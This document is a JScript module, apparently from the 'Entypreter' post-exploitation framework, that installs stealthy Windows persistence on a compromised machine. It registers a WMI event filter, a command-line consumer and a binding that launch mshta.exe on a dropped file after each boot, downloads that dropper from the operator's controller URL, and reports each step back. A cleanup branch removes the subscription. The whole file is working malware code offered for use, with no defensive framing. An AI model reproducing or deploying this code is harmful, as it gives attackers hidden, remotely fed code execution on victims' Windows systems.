try
{

    var headers = {};
    var subname = "Entypreter";
    var droppath = entypreter.file.getPath("~FDROPDIR~\\~FDROPFILE~");

    if (~CLEANUP~)
    {
        var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
        wmi.Delete("\\\\.\\root\\subscription:__EventFilter.Name=\""+subname+"\"");
        wmi.Delete("\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\""+subname+"\"");
        var ftcb = wmi.Get("__FilterToConsumerBinding").Instances_();
        var instancecount = ftcb.Count;
        var i;
        for (i = 0; i < instancecount; i++) {
            var cons = ftcb.ItemIndex(i);
            if (cons.Consumer.indexOf(subname) != -1) {
                cons.Delete_();
            }
        }
        headers["Task"] = "RemovePersistence";
        entypreter.work.report("done", headers);
        headers["Task"] = "DeleteDropper";
        entypreter.file.deleteFile(droppath);
        entypreter.work.report(entypreter.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }
    else
    {
        var wmi1 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
        var eventfilterclass = wmi1.Get("__EventFilter");
        var eventfilter = eventfilterclass.SpawnInstance_();
        eventfilter.Name = subname;
        eventfilter.EventNameSpace = "root\\Cimv2";
        eventfilter.QueryLanguage = "WQL";
        eventfilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300";
        var res = eventfilter.Put_();
        headers["Task"] = "CreateFilter";
        entypreter.work.report(res.Path, headers);

        var wmi2 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
        var commandlineeventclass = wmi2.Get("CommandLineEventConsumer");
        var commandlineevent = commandlineeventclass.SpawnInstance_();
        commandlineevent.Name = subname;
        commandlineevent.CommandLineTemplate = "C:\\Windows\\system32\\mshta.exe "+droppath;
        commandlineevent.RunInteractively = "false";
        res = commandlineevent.Put_();
        headers["Task"] = "CreateConsumer";
        entypreter.work.report(res.Path, headers);

        var wmi3 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
        var filtertoconsumerbindingclass = wmi3.Get("__FilterToConsumerBinding");
        var filtertoconsumerbinding = filtertoconsumerbindingclass.SpawnInstance_();
        filtertoconsumerbinding.Filter = "__EventFilter.Name=\""+subname+"\"";
        filtertoconsumerbinding.Consumer = "CommandLineEventConsumer.Name=\""+subname+"\"";
        res = filtertoconsumerbinding.Put_();
        headers["Task"] = "CreateBinding";
        entypreter.work.report(res.Path, headers);

        headers["X-UploadFileJob"] = "true";
        entypreter.http.downloadEx("POST", entypreter.work.make_url(), headers, droppath);
        headers["X-UploadFileJob"] = "false";
        headers["Task"] = "AddDropper";
        entypreter.work.report(entypreter.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }
    entypreter.work.report("Complete");
}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.exit();
